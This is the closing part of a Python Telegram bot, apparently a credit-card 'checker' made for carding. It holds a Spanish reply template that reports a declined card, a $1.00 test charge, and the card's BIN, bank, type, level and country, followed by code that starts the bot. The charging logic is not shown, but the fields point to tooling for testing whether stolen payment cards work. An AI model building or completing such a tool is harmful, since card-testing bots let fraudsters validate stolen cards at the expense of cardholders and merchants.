  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)


     
    
print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
    